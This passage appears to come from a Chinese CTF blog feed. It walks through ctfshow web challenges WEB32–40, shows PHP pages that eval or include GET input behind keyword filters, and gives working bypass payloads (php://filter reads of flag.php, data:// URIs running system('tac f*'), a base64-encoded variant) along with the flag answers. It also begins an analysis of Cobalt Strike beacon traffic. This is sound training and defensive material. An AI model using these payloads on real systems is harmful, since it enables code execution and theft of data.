class=\"line\">*/</span><br><span class=\"line\"></span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class=\"line\">    $c = $_GET[&#x27;c&#x27;];</span><br><span class=\"line\">    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(/i&quot;, $c))&#123;</span><br><span class=\"line\">        eval($c);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    highlight_file(__FILE__);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>可以看到，在上一题的基础上还过滤了<strong>反引号</strong>、<strong>echo</strong>、<strong>；</strong>、<strong>（</strong><br>\n那么前几题的一些 payload 就用不了了，但是 include 包含的方法依然可以使用</p>\n<p>看到上一题的 pyload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?c=include$_GET[&quot;nnnpc&quot;];&amp;nnnpc=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>\n<p>问题就出在了这个 payload 中的？c=include$_GET [“nnnpc”]; 最后面的 &quot;；&quot; 在本题被过滤了，<br>\n因此需要改用？&gt; 来闭合绕过</p>\n<p>本题 payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?c=include$_GET[&quot;nnnpc&quot;]?&gt;&amp;nnnpc=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/5N0BsWOblvBr8ROM.png!thumbnail\" alt=\"\"></p>\n<p>将 base64 编码解码以后得到 flag</p>\n<p><strong>ctfshow{f1a8e8a0-91e4-479e-9bd5-42a8f2be2d46}</strong></p>\n<h1 id=\"web33\"><a class=\"markdownIt-Anchor\" href=\"#web33\">#</a> <strong>WEB33</strong></h1>\n<p>打开环境，查看代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">/*</span><br><span class=\"line\"># -*- coding: utf-8 -*-</span><br><span class=\"line\"># @Author: h1xa</span><br><span class=\"line\"># @Date:   2020-09-04 00:12:34</span><br><span class=\"line\"># @Last Modified by:   h1xa</span><br><span class=\"line\"># @Last Modified time: 2020-09-04 02:22:27</span><br><span class=\"line\"># @email: h1xa@ctfer.com</span><br><span class=\"line\"># @link: https://ctfer.com</span><br><span class=\"line\">*/</span><br><span class=\"line\">//</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class=\"line\">    $c = $_GET[&#x27;c&#x27;];</span><br><span class=\"line\">    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(|\\&quot;/i&quot;, $c))&#123;</span><br><span class=\"line\">        eval($c);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    highlight_file(__FILE__);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>看到比上题多过滤了一个双引号<br>\n上题 payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?c=include$_GET[&quot;nnnpc&quot;]?&gt;&amp;nnnpc=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>\n<p>由于本题过滤了双引号，因此 c 传参的 include 包含语句中就不能有双引号了，所以想要绕过此题的限制还需要改动一下<br>\n之前的 nnnpc 是个字符串，因此需要带双引号，这里改为单个字符，就能有效避免双引号的使用了，这里以改为 x 为例（也可以是数字）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?c=include$_GET[x]?&gt;&amp;x=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/LmV8gUcqwxS8QFY6.png!thumbnail\" alt=\"\"></p>\n<p>成功获取 flag 的 base64 编码</p>\n<p>解码得到 flag</p>\n<p><strong>ctfshow{dad0cd8e-ce67-4697-b1fc-63ec1f9cfbd4}</strong></p>\n<h1 id=\"web34\"><a class=\"markdownIt-Anchor\" href=\"#web34\">#</a> <strong>WEB34</strong></h1>\n<p>打开环境，查看代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">/*</span><br><span class=\"line\"># -*- coding: utf-8 -*-</span><br><span class=\"line\"># @Author: h1xa</span><br><span class=\"line\"># @Date:   2020-09-04 00:12:34</span><br><span class=\"line\"># @Last Modified by:   h1xa</span><br><span class=\"line\"># @Last Modified time: 2020-09-04 04:21:29</span><br><span class=\"line\"># @email: h1xa@ctfer.com</span><br><span class=\"line\"># @link: https://ctfer.com</span><br><span class=\"line\">*/</span><br><span class=\"line\"></span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class=\"line\">    $c = $_GET[&#x27;c&#x27;];</span><br><span class=\"line\">    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(|\\:|\\&quot;/i&quot;, $c))&#123;</span><br><span class=\"line\">        eval($c);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    highlight_file(__FILE__);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>看到这题将冒号也过滤了，但是不影响上一题构造的 payload，依然能打</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?c=include$_GET[x]?&gt;&amp;x=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/DJwg9vCIiwiRX10e.png!thumbnail\" alt=\"\"></p>\n<p>解码得到 flag</p>\n<p><strong>ctfshow{5a506255-1c6d-44a8-9e45-c4b2c3f7207c}</strong></p>\n<h1 id=\"web35\"><a class=\"markdownIt-Anchor\" href=\"#web35\">#</a> <strong>WEB35</strong></h1>\n<p>打开环境，查看代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">/*</span><br><span class=\"line\"># -*- coding: utf-8 -*-</span><br><span class=\"line\"># @Author: h1xa</span><br><span class=\"line\"># @Date:   2020-09-04 00:12:34</span><br><span class=\"line\"># @Last Modified by:   h1xa</span><br><span class=\"line\"># @Last Modified time: 2020-09-04 04:21:23</span><br><span class=\"line\"># @email: h1xa@ctfer.com</span><br><span class=\"line\"># @link: https://ctfer.com</span><br><span class=\"line\">*/</span><br><span class=\"line\"></span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class=\"line\">    $c = $_GET[&#x27;c&#x27;];</span><br><span class=\"line\">    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(|\\:|\\&quot;|\\&lt;|\\=/i&quot;, $c))&#123;</span><br><span class=\"line\">        eval($c);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    highlight_file(__FILE__);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>在上一题的基础上增加过滤了 &quot;&lt;“和”=&quot;，但依然不影响之前的 payload，继续打<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/fgpadHQPIxspDDwn.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>解码得到 flag</p>\n<p><strong>ctfshow{6ad42779-430c-4f05-bb93-46960e5b0cb4}</strong></p>\n<h1 id=\"web36\"><a class=\"markdownIt-Anchor\" href=\"#web36\">#</a> <strong>WEB36</strong></h1>\n<p>打开环境，查看代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">/*</span><br><span class=\"line\"># -*- coding: utf-8 -*-</span><br><span class=\"line\"># @Author: h1xa</span><br><span class=\"line\"># @Date:   2020-09-04 00:12:34</span><br><span class=\"line\"># @Last Modified by:   h1xa</span><br><span class=\"line\"># @Last Modified time: 2020-09-04 04:21:16</span><br><span class=\"line\"># @email: h1xa@ctfer.com</span><br><span class=\"line\"># @link: https://ctfer.com</span><br><span class=\"line\">*/</span><br><span class=\"line\"></span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class=\"line\">    $c = $_GET[&#x27;c&#x27;];</span><br><span class=\"line\">    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(|\\:|\\&quot;|\\&lt;|\\=|\\/|[0-9]/i&quot;, $c))&#123;</span><br><span class=\"line\">        eval($c);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    highlight_file(__FILE__);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>发现又多过滤了 &quot;/&quot; 和 0-9 的数字，上一题的 payload 一样能打<br>\n如果前几次使用的字符是数字的话就需要进行改动，把数字改为单个字母即可</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?c=include$_GET[x]?&gt;&amp;x=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/jFgcJ5auVF25rBFr.png!thumbnail\" alt=\"\"></p>\n<p>成功，解码得到 flag</p>\n<p><strong>ctfshow{a048f30e-f227-4793-b067-3f8c5fb2a083}</strong></p>\n<h1 id=\"web37\"><a class=\"markdownIt-Anchor\" href=\"#web37\">#</a> <strong>WEB37</strong></h1>\n<p>打开环境，查看代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">/*</span><br><span class=\"line\"># -*- coding: utf-8 -*-</span><br><span class=\"line\"># @Author: h1xa</span><br><span class=\"line\"># @Date:   2020-09-04 00:12:34</span><br><span class=\"line\"># @Last Modified by:   h1xa</span><br><span class=\"line\"># @Last Modified time: 2020-09-04 05:18:55</span><br><span class=\"line\"># @email: h1xa@ctfer.com</span><br><span class=\"line\"># @link: https://ctfer.com</span><br><span class=\"line\">*/</span><br><span class=\"line\"></span><br><span class=\"line\">//flag in flag.php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class=\"line\">    $c = $_GET[&#x27;c&#x27;];</span><br><span class=\"line\">    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;</span><br><span class=\"line\">        include($c);</span><br><span class=\"line\">        echo $flag;</span><br><span class=\"line\">    </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    highlight_file(__FILE__);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>看到由前几题的 eval 变成了 include<br>\n 需要用到 php 的伪协议，这里可以使用 data 的伪协议</p>\n<p>由于过滤了字符串 flag，因此得用前面介绍过的方法进行绕过：</p>\n<p>？或通配符<em>或截断（这里展示通配符</em>）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?c=data://text/plain,&lt;?php system(&quot;tac f*&quot;);</span><br></pre></td></tr></table></figure>\n<p>引用 LetheSec 师傅博客中的解释：</p>\n<blockquote>\n<p><strong>data://</strong><br>\n 同样类似与 php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的 data:// 流会被当作 php 文件执行。从而导致任意代码执行。</p>\n</blockquote>\n<p>data 与包含函数结合的时候输入的 data:// 流就会被当作 php 文件执行，因此就可以利用这点进行命令执行获取 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/zgJHecsZju2rE7gL.png!thumbnail\" alt=\"\"></p>\n<p>得到 flag：</p>\n<p><strong>ctfshow{47106e1a-3b17-400c-b673-942b343939a2}</strong></p>\n<h1 id=\"web38\"><a class=\"markdownIt-Anchor\" href=\"#web38\">#</a> <strong>WEB38</strong></h1>\n<p>打开环境，查看代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">/*</span><br><span class=\"line\"># -*- coding: utf-8 -*-</span><br><span class=\"line\"># @Author: h1xa</span><br><span class=\"line\"># @Date:   2020-09-04 00:12:34</span><br><span class=\"line\"># @Last Modified by:   h1xa</span><br><span class=\"line\"># @Last Modified time: 2020-09-04 05:23:36</span><br><span class=\"line\"># @email: h1xa@ctfer.com</span><br><span class=\"line\"># @link: https://ctfer.com</span><br><span class=\"line\">*/</span><br><span class=\"line\"></span><br><span class=\"line\">//flag in flag.php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class=\"line\">    $c = $_GET[&#x27;c&#x27;];</span><br><span class=\"line\">    if(!preg_match(&quot;/flag|php|file/i&quot;, $c))&#123;</span><br><span class=\"line\">        include($c);</span><br><span class=\"line\">        echo $flag;</span><br><span class=\"line\">    </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    highlight_file(__FILE__);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>发现在上一题的基础上，php 和 file 都被过滤了，这可能对 php://filter 协议来说过滤的比较多，但是对与 data 协议没有影响<br>\n上题 payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?c=data://text/plain,&lt;?php system(&quot;tac f*&quot;);</span><br></pre></td></tr></table></figure>\n<p>对于上一题 payload 来说，因为把 php 过滤了，因此影响的就是后面的 php 语句<br>\n办法就是将 php 语句进行 base64 编码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZioiKTs=</span><br></pre></td></tr></table></figure>\n<p>这样就解决了含有 php 的问题，去打一下<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/90BEMaNp4iBtHroB.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>成功获得 flag：</p>\n<p><strong>ctfshow{0946522d-4044-4182-a19e-fe3fbfaecab2}</strong></p>\n<h1 id=\"web39\"><a class=\"markdownIt-Anchor\" href=\"#web39\">#</a> <strong>WEB39</strong></h1>\n<p>打开环境，查看代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">/*</span><br><span class=\"line\"># -*- coding: utf-8 -*-</span><br><span class=\"line\"># @Author: h1xa</span><br><span class=\"line\"># @Date:   2020-09-04 00:12:34</span><br><span class=\"line\"># @Last Modified by:   h1xa</span><br><span class=\"line\"># @Last Modified time: 2020-09-04 06:13:21</span><br><span class=\"line\"># @email: h1xa@ctfer.com</span><br><span class=\"line\"># @link: https://ctfer.com</span><br><span class=\"line\">*/</span><br><span class=\"line\"></span><br><span class=\"line\">//flag in flag.php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class=\"line\">    $c = $_GET[&#x27;c&#x27;];</span><br><span class=\"line\">    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;</span><br><span class=\"line\">        include($c.&quot;.php&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    highlight_file(__FILE__);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>发现被包含进去的东西被强行加上了.php<br>\n 所以需要将 data 语句进行闭合，使后面的.php 失效，如下所示（加上 &quot;?&gt;&quot; 进行闭合）：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?c=data://text/plain,&lt;?php system(&quot;tac f*&quot;); ?&gt;</span><br></pre></td></tr></table></figure>\n<p>这样的话 data 协议已经执行了 php 语句，后面的.php 就失效了<br>\n本题也没有过滤 php 和 file，因此不需要 base64 编码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/TVJxCzzyRByMOqv0.png!thumbnail\" alt=\"\"></p>\n<p>成功打通获得 flag：</p>\n<p><strong>ctfshow{bbb00360-c800-4d03-9447-957dc601ab66}</strong></p>\n<h1 id=\"web40\"><a class=\"markdownIt-Anchor\" href=\"#web40\">#</a> <strong>WEB40</strong></h1>\n<p>打开环境，查看代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">/*</span><br><span class=\"line\"># -*- coding: utf-8 -*-</span><br><span class=\"line\"># @Author: h1xa</span><br><span class=\"line\"># @Date:   2020-09-04 00:12:34</span><br><span class=\"line\"># @Last Modified by:   h1xa</span><br><span class=\"line\"># @Last Modified time: 2020-09-04 06:03:36</span><br><span class=\"line\"># @email: h1xa@ctfer.com</span><br><span class=\"line\"># @link: https://ctfer.com</span><br><span class=\"line\">*/</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class=\"line\">    $c = $_GET[&#x27;c&#x27;];</span><br><span class=\"line\">    if(!preg_match(&quot;/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\（|\\）|\\-|\\=|\\+|\\&#123;|\\[|\\]|\\&#125;|\\:|\\&#x27;|\\&quot;|\\,|\\&lt;|\\.|\\&gt;|\\/|\\?|\\\\\\\\/i&quot;, $c))&#123;</span><br><span class=\"line\">        eval($c);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    highlight_file(__FILE__);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>发现 include 变回了 eval，而且还过滤了很多东西</p>\n",
            "tags": [
                "WEB"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/CS%E6%B5%81%E9%87%8F%E6%B5%85%E6%9E%90/",
            "url": "https://nnnpc.github.io/2024/04/16/CS%E6%B5%81%E9%87%8F%E6%B5%85%E6%9E%90/",
            "title": "CS流量浅析",
            "date_published": "2024-04-16T05:58:18.972Z",
            "content_html": "<h1 id=\"cs的工作流程\"><a class=\"markdownIt-Anchor\" href=\"#cs的工作流程\">#</a> cs 的工作流程</h1>\n<p>1、被控机先向 TeamServer 发送心跳包，包中包含了主机信息和协商密钥等信息，而这些信息都被使用 RSA 公钥进行了加密放在了 Cookie 中</p>\n<p>2、server 端第一次心跳之后进入睡眠，并用私钥将数据包解开获得主机信息和协商密钥，基于协商密钥会生成新的 AES<br>\nkey 和 HMAC key</p>\n<p>3、睡眠时间过后，会再一次发送心跳包询问是否有新的命令，当有新的命令出现时会将其数据包加密后发送，而命令会作为该回应包的 body 发送</p>\n<p>4、被控端在接收到数据包之后进行解密获取命令，再将命令执行的结果加密后返回给 TeamServer，该次传输使用 POST 请求发送回 TeamServer</p>\n<p>5、TeamServer 解密之后能看到明文的回显</p>\n<p>6（不同情况）、当 3 中所说的睡眠时间过了之后，再次发送心跳包却没有收到新的指令信息，这时候 teamserver 就会返回空包</p>\n<p>ps：还需要知道的是，Private Key 和 Public<br>\nKey 是特定的，并且保存在.cobaltstrike.beacon_keys 中，也就是说.cobaltstrike.beacon_keys 是特定的，对于一个固定的 CS，经过首次使用 CS 软件，就会生成一组固定的私钥和公钥，而这也是通信的关键。现在很多 CS 的私钥已经披露了，也就意味着如果抓到攻击者的 CS 流量，能够精确找到对应的私钥，那么解密流量包也是有可能的，但是前提不是魔改的 CS</p>\n<p>用一副流程图来解释下 CS 的通信流程（来自 Chris 师傅文章流程图的魔改）：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/IAq4qZHApAwrtoYW.png!thumbnail\" alt=\"\"></p>\n<h1 id=\"信标\"><a class=\"markdownIt-Anchor\" href=\"#信标\">#</a> 信标</h1>\n<p>接下来来说说信标，信标就是 cs 中的 beacon，对于 windwos 操作系统来说，就是 cs 生成需要执行的 beacon.exe 文件，同时因为信标由 teamserver 端进行生成，因此其中包含很多 teamserver 端的信息，更是可以通过静态和动态的信标去解密 cs 的通信流量，这些后文中都会提到</p>\n<h1 id=\"心跳包\"><a class=\"markdownIt-Anchor\" href=\"#心跳包\">#</a> 心跳包</h1>\n<p>接下来浅浅的解释一下心跳包的作用与含义。利用心跳包的这种方式，定时向 TeamServer 进行发包询问，无命令就返回空包，有命令加密后进行回包，有效避免了进行长时间不间断的数据传输和通信而被防御设备检测到异常流量采取措施，sleep 的时间一般是 60s。从正向来看，当 sleep 的时间默认为 60s 时，我们发送命令获得回显的时间有长有短，这就是原因，越接近睡眠时间结束发送的命令，获得的回显时间也越快，只有当心跳包发送进行询问，发现有新的指令，这个时候才会进行传输通信。这里顺便提一嘴，指令是指 TeamServer 端发送的任意动作指令，不是单单指命令行的操作指令</p>\n<p>当然，个人看来，从防守方来讲，既然知道了心跳包的的存在，一样可以通过改写规则来实现检测和拦截，一般 CS 的 sleep 时间设定在 6-9s。前段时间和某大厂做流量检测产品的大手子师傅聊了天，知道了其实做流量检测这种安全产品，主要就是想方法让它越做越精准，而不是只会存在一大堆不准确的误报，费时费力不说，客户看了也头疼。例如某一个渗透工具，它可主要分为三次通信，第一次连接，第二次测试，第三次进行执行，这时候没有必要第一次在尝试连接的时候便进行告警，很多的业务流量可能也是相似的，如果这就直接告警那会出现铺天盖地的误报。一般第一次和第二次通信都抓他们的特征包并且做好记录，当第三次出现时，再发出告警并且做一些拦截防护措施，这样既避免了误报，也实现了成功告警拦截</p>\n<h1 id=\"抓包\"><a class=\"markdownIt-Anchor\" href=\"#抓包\">#</a> 抓包</h1>\n<p>接下来抓取流量进行分析</p>\n<p>攻击机：192.168.40.144</p>\n<p>靶机：192.168.40.131</p>\n<p>首先在攻击机上开启 cs 服务，设置好监听后生成 windows 木马，将生成的 beacon.exe 放入 windows 靶机上，开始抓取流量</p>\n<h2 id=\"第一次心跳包\"><a class=\"markdownIt-Anchor\" href=\"#第一次心跳包\">#</a> 第一次心跳包</h2>\n<p>双击 beacon.exe 之后暂停进行分析</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/hIxnPjmgJyiGznjw.png!thumbnail\" alt=\"\"></p>\n<p>这时候我们的 TeamServer 显示靶机已经受害，被上线了</p>\n<p>按照 CS 的工作流程，在 TeamServer 